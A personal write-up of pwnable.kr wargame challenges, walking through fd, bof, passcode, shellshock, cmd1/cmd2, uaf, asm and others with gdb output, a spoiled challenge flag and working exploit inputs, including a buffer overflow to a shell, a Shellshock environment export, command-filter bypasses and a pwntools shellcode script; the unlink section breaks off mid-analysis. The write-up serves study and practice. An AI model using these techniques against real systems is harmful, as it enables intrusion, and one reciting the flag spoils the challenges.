How to access the challenge in the first place:
1. go to pwnable.kr using a web browser
2. get access to a terminal that can use ssh (since I have Windows, I downloaded a Linux VM on VirtualBox)
3. open a terminal and type in the ssh statement in the challenge description
4. you should have access, you can now use terminal commands like ls to look through the beginning levels for files

-----------------------------------------
Fd

int fd = atoi( argv[1] ) - 0x1234;
int len = 0;
len = read(fd, buf, 32);
if(!strcmp("LETMEWIN\n", buf)){
	printf("good job :)\n");
	system("/bin/cat flag");
	exit(0);
}

This is the important part of the code. On first glance, the obvious thing to manipulate is the fd variable, which can be controlled with input. Then you can use the fd in the read method. But how is that relevant? That requires reading up a little more, but basically if fd is 0, then read takes in input from stdin. 

Since fd is subtracted 0x1234 (or 4660), in order to make fd 0, input a 4660.

That doesn't get you the flag, though - the strcmp function checks if buf (or now your input) is equal to LETMEWIN\n, so just type that into the terminal and you should get your flag.

Solution:
4660
LETMEWIN\n

-----------------------------------------
Collision

unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

After looking through the program, I realized that in order to get the flag, the return value of the check_password function must be equivalent to hashcode (0x21DD09EC). But how do I actually get there?

check_password takes in a 20 character string, and essentially reads it in 4 characters at a time and then adds them for the final result. So if you had a string like "\x11" * 20, the return value would be "\x55\x55\x55\x55". So all you basically need to do is come up with five four byte strings that add up to 0x21DD09EC. 

The way I did it makes the five strings add up to 121DD09EC (notice the additional 1 at the front), and it works because res only accounts for the last 8 digits.

I initially came up with the string of "\x33" * 16 + "\x20\x3d\x10\x55", but the final string ends with a 20 (little-endian makes the actual string 55103d20). 
I soon realized though that the program had issues with 0 ending the string, so I had to ensure that the final byte wasn't a 0 in each of the four byte strings. So, I instead had to do "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55".

Solution:
./col $(python -c 'print "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55"')


-----------------------------------------
Bof

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

So this particular challenge talked about the issue of buffer overflow. The first thing to realize is that the array overflowme doesn't have a size limit, and as such, giving the array more than 32 characters makes the data you put in overflow into memory you're not supposed to have access to. So we want to overflow the value of key, which currently is 0xdeadbeef, with the value of 0xcafebabe, so that we can end up with a shell. 

The problem now is how much I need to overflow before I can finally access the memory for key. I could just randomly put in A's and then add in a \xfe\xca\xbe\ba, but I instead used gdb to find the exact value. 

I booted up gdb and disassembled the func function to get this in assembly:
gdb-peda$ disas func
Dump of assembler code for function func:
   0x8000062c <+0>:	push   ebp
   0x8000062d <+1>:	mov    ebp,esp
   0x8000062f <+3>:	sub    esp,0x48
=> 0x80000632 <+6>:	mov    eax,gs:0x14
   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:	xor    eax,eax
   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:	call   0xb7e630d0 <_IO_puts>
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e62820 <_IO_gets>
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:	jne    0x8000066b <func+63>
   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:	call   0xb7e3e850 <__libc_system>
   0x80000669 <+61>:	jmp    0x80000677 <func+75>
   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:	call   0xb7e630d0 <_IO_puts>
   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:	je     0x80000688 <func+92>
   0x80000683 <+87>:	call   0xb7ef9560 <__stack_chk_fail>
   0x80000688 <+92>:	leave  
   0x80000689 <+93>:	ret   

The important line in all the assembly above is 0x80000654, or func+40. That line compares the value of ebp+8 (presumably key's memory location) with the value of 0xcafebabe. So I set a breakpoint there.

On the way to accessing the breakpoint, I was asked to give input for the overflow me buffer, which I proceeded to overflow with a random amount of A's.

At the breakpoint, I then examine the registers to see where the value of the overflowme variable is.

Since I use gdb-peda, the stack data shown shows me that the variable is at 0xbffff3cc.

0000| 0xbffff3b0 --> 0xbffff3cc ('A' <repeats 47 times>)
0004| 0xbffff3b4 --> 0xbffff454 --> 0x3b2cb624 
0008| 0xbffff3b8 --> 0xb7fb3000 --> 0x1aedb0 
0012| 0xbffff3bc --> 0x9027 
0016| 0xbffff3c0 --> 0xffffffff 
0020| 0xbffff3c4 --> 0x2f ('/')
0024| 0xbffff3c8 --> 0xb7e10dc8 --> 0x2b76 ('v+')
0028| 0xbffff3cc ('A' <repeats 47 times>)

Since I know that overflowme is at 0xbffff3cc and $ebp+8 (aka key variable) is at 0xbffff400, I can calculate that 0xbffff400 - 0xbffff3cc = 52. So I need to overflow 52 characters into overflowme and then add 0xcafebabe to finally overwrite the key variable.

In the solution below, besides the standard python script, the ; cat - is necessary to keep the program open while I utilize the open shell.

Solution:
(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000


-----------------------------------------
Flag

So, I initially tried to open the file in GDB, then tried to disassemble the main function. However, GDB told me that it couldn't locate the file in question, which was weird. So I instead took an alternate approach and used the strings command on the flag program, which quickly revealed to me in this particular part of the output:

ACG?
'_(H
USQRH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
_j<X
Ph^)-
j2AZE)
/proc/self/exe

that the flags executable was packed with UPX. So I unpacked with UPX (upx -d ./flag) to get a file I can actually disassemble.

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:	push   rbp
   0x0000000000401165 <+1>:	mov    rbp,rsp
   0x0000000000401168 <+4>:	sub    rsp,0x10
   0x000000000040116c <+8>:	mov    edi,0x496658
   0x0000000000401171 <+13>:	call   0x402080 <puts>
   0x0000000000401176 <+18>:	mov    edi,0x64
   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:	mov    rsi,rdx
   0x0000000000401192 <+46>:	mov    rdi,rax
   0x0000000000401195 <+49>:	call   0x400320
   0x000000000040119a <+54>:	mov    eax,0x0
   0x000000000040119f <+59>:	leave  
   0x00000000004011a0 <+60>:	ret    
End of assembler dump.
gdb-peda$ x/10s *0x6c2070
0x496628:	"UPX...? sounds like a delivery service :)"
0x496652:	""
0x496653:	""
0x496654:	""
0x496655:	""
0x496656:	""
0x496657:	""
0x496658:	"I will malloc() and strcpy the flag there. take it."
0x49668c:	"FATAL: kernel too old\n"
0x4966a3:	"/dev/urandom"

The searching for the actual flag was made easier by the comment found in the disassembly.

Solution:
upx -d ./flag
gdb flag
x/10s *0x6c2070

-----------------------------------------
Passcode

Error: I kept piping in input and then wondering why the scanf method refused to accept further input... goes to show that I"m a dumbass and still have a lot to learn. Piped in input essentially is all the input the program's going to receive. Welp. Learned something new.

So the first thing I did was run the program - I checked if passcode could accept 338150 (which it couldn't, it seg faulted). So I then decided to take a look at the welcome function. I wasn't really sure what to expect, but I filled the name array with 100 A's (the welcome function limited input size), and took a look in GDB.

I found that the passcode1 variable is at $ebp-10, passcode2 variable is at $ebp-0c, and that the name array is at $ebp-70. Since the offsets are in hex, 0x70-0x10 = 96. This means that the remaining 4 spots are unaccounted for, and that I'm able to control the value for passcode1. As evidence, when I tested passcode1's value in GDB, it was 0x41414141, which is hex for AAAA.

However, just this alone isn't enough.

printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

The above code in the login function also possesses a bug: scanf should accept &passcode1, not passcode1. As a result, scanf will read in a value and store it at the memory position with passcode1's value. This means that I now can write any value to any place in memory.

Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
=> 0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>


The way I did it, I used login+47 (the call to fflush) as a basis to find what to overwrite. Since login+47 calls (or jumps to) the position at 0x8048430, I can instead overwrite the position (which I don't know and shouldn't matter) with login+127's value, which is essentially just system("/bin/cat flag").

Another thing that tripped me was the scanf accepted only %d, so that attempting to give it the hex value for login+127 wouldn't work. Therefore, you have to convert login+127 (0x080485e3) to its decimal component, 134514147.

Solution:
(python -c 'print "A" *96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode

-----------------------------------------
Random

So the hint given was that random isn't really random. So I booted up GDB, and took a look at the disassembly:

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   %rbp
   0x00000000004005f5 <+1>:	mov    %rsp,%rbp
   0x00000000004005f8 <+4>:	sub    $0x10,%rsp
   0x00000000004005fc <+8>:	mov    $0x0,%eax
   0x0000000000400601 <+13>:	callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:	movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:	mov    $0x400760,%eax
   0x0000000000400615 <+33>:	lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:	mov    %rdx,%rsi
   0x000000000040061c <+40>:	mov    %rax,%rdi
   0x000000000040061f <+43>:	mov    $0x0,%eax
   0x0000000000400624 <+48>:	callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:	xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:	cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    $0x400763,%edi
   0x000000000040063b <+71>:	callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    $0x400769,%edi
   0x0000000000400645 <+81>:	mov    $0x0,%eax
   0x000000000040064a <+86>:	callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    $0x0,%eax
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    $0x400778,%edi
   0x000000000040065b <+103>:	callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    $0x0,%eax
   0x0000000000400665 <+113>:	leaveq 
   0x0000000000400666 <+114>:	retq   

I see that the key ^ random line takes place at main+56, or the xor command. From that, I can figure out that key is either %rbp-4 or $rbp-8. I just randomly inputted a value and reran the program (changing input values) to figure out that key is located at $rbp-8. This means that $rbp-4 is the random value. I ran the program several times, and each time, $rbp-4 seemed to have the value of 0x6b8b4567.

I then xor'd 0x6b8b4567 with 0xdeadbeef to get 0xb526fb88. However, the job still isn't done, as key accepts an integer value. So I convert 0xb526fb88 to 3039230856 to get my final answer.

Solution:
3039230856

-----------------------------------------
Input - (AKA I don't know how sockets work)

Error: I incorrectly thought that argc was related to the length of the string. Whups. It's actually the amount of arguments (which must be separated by a space - the part I forgot).

Another notable mistake was that I got too caught up in attempting to treat the 0x00 as an actual hex value, rather than the string that it actually was...

You need to set up an actual socket connection (nc -l -k -p 2223 in my case) in order to actually connect to it. Lol, I'm a socket noob.

Below's the working python script as long as the file is on your computer (I understand that the file won't necessarily work as I don't have write permissions on the other server)

This is more of a syntax challenge, which I really don't like personally (because I know jack about syntax).

import struct, os, sys, socket
from subprocess import *

list = ['./a.out']

for i in range(99):
  list.append('A')

list[65] = ''
list[66] = '\x20\x0a\x0d'
list[67] = "2222"

r, w = os.pipe()
r1, w1 = os.pipe()

my_env = os.environ.copy()
my_env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"

p = Popen(list, stdin=r1, stderr=r, env=my_env)

os.write(w1, "\x00\x0a\x00\xff")
os.write(w, "\x00\x0a\x02\xff")

f = open("\x0a", 'wb')
f.write("\x00\x00\x00\x00")
f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 2222))
s.send("\xde\xad\xbe\xef")
s.close()

print(p.communicate()[0])

Solution:
Come back to it later...

-----------------------------------------
Leg

key1: it seems to be essentially returning the value of the pc. (0x8cdc)
   0x00008cdc <+8>:  mov   r3, pc
   0x00008ce0 <+12>: mov   r0, r3
   0x00008ce4 <+16>: sub   sp, r11, #0

key2: it seems to return pc + 4 (0x8d04 + 4)
   0x00008d04 <+20>: mov   r3, pc
   0x00008d06 <+22>: adds  r3, #4
   0x00008d08 <+24>: push  {r3}
   0x00008d0a <+26>: pop   {pc}
   0x00008d0c <+28>: pop   {r6}     ; (ldr r6, [sp], #4)
   0x00008d10 <+32>: mov   r0, r3

key3: it returns lr, register containing the return address of the function (0x8d80)
   0x00008d28 <+8>:  mov   r3, lr
   0x00008d2c <+12>: mov   r0, r3

   (main function key3 call)
   0x00008d7c <+64>: bl 0x8d20 <key3>
   0x00008d80 <+68>: mov   r3, r0


= 1A764 (or 108388)

So, the main mistake I made in the comments above is that I don't know ARM (I tried to read it like x86 assembly).

The main thing that I needed to know is that pc doesn't reference the current instruction, but the address of the 2nd instruction after the current one.


So, the more correct version would be 0x8cdc (+ 8 due to ARM pc characteristics) + 0x8d04 + 4 (+ 4 as I skip 2 instructions, not 2 bytes, check above code if confused) + 0x8d80 (lr unaffected).

This gives:  0x8d04+8+0x8cdc+8+0x8d80 = 108400

Solution:
108400

-----------------------------------------
Mistake

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
   int i;
   for(i=0; i<len; i++){
      s[i] ^= XORKEY;
   }
}

int main(int argc, char* argv[]){
   
   int fd;
   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

   printf("do not bruteforce...\n");
   sleep(time(0)%20);

   char pw_buf[PW_LEN+1];
   int len;
   if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
      printf("read error\n");
      close(fd);
      return 0;      
   }

   char pw_buf2[PW_LEN+1];
   printf("input password : ");
   scanf("%10s", pw_buf2);

   // xor your input
   xor(pw_buf2, 10);

   if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
      printf("Password OK\n");
      system("/bin/cat flag\n");
   }
   else{
      printf("Wrong Password\n");
   }

   close(fd);
   return 0;
}

So, at first glance, I don't see anything wrong. Given the hints put out, I understand that the issue is most likely a operator problem. However, as I have little experience with fd in c, I don't understand what to do.

I instead copied the c code onto my own machine so I could compile a new program. When I reran the new program, though, I noticed that the program was accepting input twice.

A little more looking revealed that fd was 0 after this line of code:

   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

This meant that pw_buf was reading in from input, as well as pw_buf2. So I just need to give two inputs ten characters wide that when xor'd give each other as answers. So I used AAAAAAAAAA (41414141414141414141) and @@@@@@@@@@ (40404040404040404040).

Solution:
AAAAAAAAAA
@@@@@@@@@@


-----------------------------------------
Shellshock

#include <stdio.h>
int main(){
   setresuid(getegid(), getegid(), getegid());
   setresgid(getegid(), getegid(), getegid());
   system("/home/shellshock/bash -c 'echo shock_me'");
   return 0;
}

I have no idea where to start. So I looked up a bit on Wikipedia, and I found this line of code: 
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test".

Supposedly it exploits the shellshock bug, but when I type it into the console, nothing happens when I run the shellshock program. I realize I'm missing something - I look a little further and I see that setresuid() might have a vulnerability with the environment variables... but I have no idea how to make that work.

So, after a little bit of research, I found out you're supposed to use export to bring the environment variable in. 

So the more appropriate solution would be:
export x='() { :;}; /bin/cat flag'. (the latter half of the code above was just a test)

Solution:
export x='() { :;}; /bin/cat flag'
./shellshock

-----------------------------------------
coin1

   ---------------------------------------------------
   -              Shall we play a game?              -
   ---------------------------------------------------
   
   You have given some gold coins in your hand
   however, there is one counterfeit coin among them
   counterfeit coin looks exactly same as real coin
   however, its weight is different from real one
   real coin weighs 10, counterfeit coin weighes 9
   help me to find the counterfeit coin with a scale
   if you find 100 counterfeit coins, you will get reward :)
   FYI, you have 30 seconds.
   
   - How to play - 
   1. you get a number of coins (N) and number of chances (C)
   2. then you specify a set of index numbers of coins to be weighed
   3. you get the weight information
   4. 2~3 repeats C time, then you give the answer
   
   - Example -
   [Server] N=4 C=2  # find counterfeit among 4 coins with 2 trial
   [Client] 0 1      # weigh first and second coin
   [Server] 20       # scale result : 20
   [Client] 3        # weigh fourth coin
   [Server] 10       # scale result : 10
   [Client] 2        # counterfeit coin is third!
   [Server] Correct!

   - Ready? starting in 3 sec... -

N=676 C=10

So, from an early look at this, I figure that I probably need to write a script to deal with this.

My initial approach used a binary search to attempt to look for the coin, as in the example above. 

The script that I used can be found under the name of root.py, which should be in the same folder this writeup is in. I also had to login to one of pwnable.kr's previous challenges and nc 0 9007 to it from there as my connection was too slow originally.

Solution:
ssh mistake@pwnable.kr -p2222 (any ssh to pwnable should be fine)
cd /tmp/
vim root.py
Copy/Paste
python root.py

-----------------------------------------
blackjack

Solution:
Just bet a negative amount of money and lose.

-----------------------------------------
lotto
   
   // calculate lotto score
   int match = 0, j = 0;
   for(i=0; i<6; i++){
      for(j=0; j<6; j++){
         if(lotto[i] == submit[j]){
            match++;
         }
      }
   }


The nested for loop has problems. I just need to input a number with six of the same bytes and hope that one of the bytes is in the random number.

In this case, I just repeatedly entered !!!!!! for my lotto input in the hopes that !(ASCII 33) would be one of the randomly chosen numbers. 

Solution:
!!!!!! (until it outputs flag)

-----------------------------------------
cmd1

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "flag")!=0;
   r += strstr(cmd, "sh")!=0;
   r += strstr(cmd, "tmp")!=0;
   return r;
}
int main(int argc, char* argv[], char** envp){
   putenv("PATH=/fuckyouverymuch");
   if(filter(argv[1])) return 0;
   system( argv[1] );
   return 0;
}

What's happening in this program is that filter is checking if the argument given has flag, sh, or tmp, in it. If it does, it immediately exits the program. This prevents us from just typing in something like "cat flag" for the argument.

I messed around a bit before determining that since there is no /fuckyouverymuch directory, I would be better off just bypassing the filter. So I did 
./cmd1 "/bin/cat f*" to find the flag.

Solution:
./cmd1 "/bin/cat f*"
mommy now I get what PATH environment is for :)

-----------------------------------------
cmd2

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "=")!=0;
   r += strstr(cmd, "PATH")!=0;
   r += strstr(cmd, "export")!=0;
   r += strstr(cmd, "/")!=0;
   r += strstr(cmd, "`")!=0;
   r += strstr(cmd, "flag")!=0;
   return r;
}

extern char** environ;
void delete_env(){
   char** p;
   for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
   delete_env();
   putenv("PATH=/no_command_execution_until_you_become_a_hacker");
   if(filter(argv[1])) return 0;
   printf("%s\n", argv[1]);
   system( argv[1] );
   return 0;
}

So, this isn't something I found out on my own, but if you change directory to the topmost parent and call pwd, pwd just returns a /. 

This actually makes the problem so much easier. I just did what you normally do when you try to cat a flag in a folder and replaced the slashes with \$(pwd).

/bin/cat /home/cmd2/f* (I use f* b/c I can't type flag b/c of the filter)

So I would use \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*. (don't forget the two cd ..; statements to access the topmost parent).

Solution:
./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*"

-----------------------------------------
uaf -- go over this again, you're (me) rusty as hell

#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
   virtual void give_shell(){
      system("/bin/sh");
   }
protected:
   int age;
   string name;
public:
   virtual void introduce(){
      cout << "My name is " << name << endl;
      cout << "I am " << age << " years old" << endl;
   }
};

class Man: public Human{
public:
   Man(string name, int age){
      this->name = name;
      this->age = age;
        }
        virtual void introduce(){
      Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
   Human* m = new Man("Jack", 25);
   Human* w = new Woman("Jill", 21);

   size_t len;
   char* data;
   unsigned int op;
   while(1){
      cout << "1. use\n2. after\n3. free\n";
      cin >> op;

      switch(op){
         case 1:
            m->introduce();
            w->introduce();
            break;
         case 2:
            len = atoi(argv[1]);
            data = new char[len];
            read(open(argv[2], O_RDONLY), data, len);
            cout << "your data is allocated" << endl;
            break;
         case 3:
            delete m;
            delete w;
            break;
         default:
            break;
      }
   }

   return 0;   
}

OK, so I needed a little help with this one. After a lot of experimentation and help from Google, I was able to actually decently figure what was going on. It's these few lines in GDB (if you disassemble the main function) that are the trick to solving the problem:

   0x0000000000400fcd <+265>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>: mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>: add    rax,0x8
=> 0x0000000000400fd8 <+276>: mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>: mov    rdi,rax
   0x0000000000400fe2 <+286>: call   rdx

But the problem is getting your saved data value into $rbp-0x38. So I had to experiment with the order of 1, 2, and 3 commands. I know that 3 comes before 1 (so I can abuse the uaf bug), but I don't know how 3 or 2 relate. So I ran GDB multiple times, testing registers before I realized that 3 must be called first, and 2 must be then called twice or more. For some reason one 2 call wasn't enough... I'm assuming that the data needed to be stacked to a certain point on the memory, and one call asn't enough to do that.

So I had to call the program in 3, 2, 2, 1.

The data I input would also then be put into $rbp-0x38, which then according to the assembly, (*rbp-0x38 + 8) would be called by the program. So I obviously want to call the give_shell function in the code, which when examined in the readelf output reveals the vtable to be at 0x401560, and give_shell to beat 0x40117a.

root@kali:~/Downloads# readelf uaf -a | grep Man | c++filt
    57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 typeinfo for Man
    78: 00000000004015c8     5 OBJECT  WEAK   DEFAULT   15 typeinfo name for Man
    83: 0000000000401560    32 OBJECT  WEAK   DEFAULT   15 vtable for Man
    94: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   100: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   110: 00000000004012d2    54 FUNC    WEAK   DEFAULT   13 Man::introduce()

root@kali:~/Downloads# readelf uaf -a | grep give_shell | c++filt
    85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 Human::give_shell()

A little looking in GDB reveals that the give_shell value is stored in 0x401570, or vtable+16.

gdb-peda$ x/10x 0x401560
0x401560 <_ZTV3Man>: 0x00000000  0x00000000  0x004015d0  0x00000000
0x401570 <_ZTV3Man+16>: 0x0040117a  0x00000000  0x004012d2  0x00000000
0x401580 <_ZTV5Human>:  0x00000000  0x00000000

So since the program calls (*rbp-0x38 + 8), I need to subtract 8 from 0x401570 to get 0x401568 as my input.

Solution:
(python -c 'print "\x68\x15\x40\x00" + "\x00" * 4') > /tmp/test
./uaf 8 /tmp/test (8 is just the size of a byte)
3
2
2
1

Tips I learned: set print asm-demangle on (C++, makes things legible)
                use readelf when unable to find function locations
                (readelf -a uaf | grep Man | c++filt in this case)
                scp -P2222 uaf@pwnable.kr:uaf /root/Downloads to copy from pwnable.kr


-----------------------------------------
codemap

You need IDA Pro codemap. I'll come back when I have it. or not...



-----------------------------------------
memcpy

So, for this particular challenge, I had no idea what to do, so I just bruteforced it with a script. Luckily enough, it didn't take much to bruteforce. As for my script, I wrote a really lazy version where I initially started out with an array like:
[8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]
and I would increment a certain position depending on the program output.

For example, if the output stopped on experiment 5, that most likely meant the value in input[3] was off. So I had a loop (it's in memcpy.py, a very lazily written script) that kept incrementing input[3] until I got the text output for experiment 6 (or at least part of it). That means the value in input[4] was off. So I continued on and on until I got the flag.

flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
(just because I really don't want to brute force it again)

Solution:
python memcpy.py
(then edit script as necessary)

-----------------------------------------
asm

from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)


print(shellcode)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
output = p.recvline()
print(output)

I found a really convenient way to send shellcode online. Obviously I'm keeping this saved (not my work ofc) for future reference here.


-----------------------------------------
unlink

So, for this particular challenge, what I did continually put in input and observe the results from the program (all in assembly/GDB of course). The first thing I did was send in a string like "AAAABBBBCCCCDDDDEEEEFFFFGGGG". 

THe unlink method is obviously of the most interest, so I took a look at the assembly there. There, the assembly attempted to store the value of FFFF into the memory at EEEE and the value of EEEE at the memory of FFFF. I first attempted to overwrite the next instruction address with the memory address of the shell function conveniently given, but nothing happened. SO, I need to try something else.

Going on, I notice something interesting in the code AFTER the method has been returned. Namely, this: 

   0x80485f7 <main+200>:   add    esp,0x10
=> 0x80485fa <main+203>:   mov    eax,0x0
   0x80485ff <main+208>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x8048602 <main+211>:   leave  
   0x8048603 <main+212>:   lea    esp,[ecx-0x4]

The lea is particularly relevant, and even more so when you take a closer look at the unlink disassembly.

   0x08048504 <+0>:  push   ebp
   0x08048505 <+1>:  mov    ebp,esp
   0x08048507 <+3>:  sub    esp,0x10
   0x0804850a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x0804850d <+9>:  mov    eax,DWORD PTR [eax+0x4]
   0x08048510 <+12>: mov    DWORD PTR [ebp-0x4],eax
   0x08048513 <+15>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048516 <+18>: mov    eax,DWORD PTR [eax]
   0x08048518 <+20>: mov    DWORD PTR [ebp-0x8],eax
   0x0804851b <+23>: mov    eax,DWORD PTR [ebp-0x8]
   0x0804851e <+26>: mov    edx,DWORD PTR [ebp-0x4]
   0x08048521 <+29>: mov    DWORD PTR [eax+0x4],edx
   0x08048524 <+32>: mov    eax,DWORD PTR [ebp-0x4]
   0x08048527 <+35>: mov    edx,DWORD PTR [ebp-0x8]
   0x0804852a <+38>: mov    DWORD PTR [eax],edx
   0x0804852c <+40>: nop
   0x0804852d <+41>: leave  
   0x0804852e <+42>: ret    

Essentially, this method is doing this:
$ebp-0x4 = FFFF
$ebp-0x8 = EEEE

eax = EEEE
edx = FFFF
$eax = edx
eax = FFFF
edx = EEEE
$eax = edx

The relevant part is that $ebp-0x4 is controlled by me, and is currently FFFF in this session. Great! However, I need to take into account this:

   0x0804852d <+41>: leave  

This alters my base pointer by changing it back to what it was before (but luckily I can see using GDB)

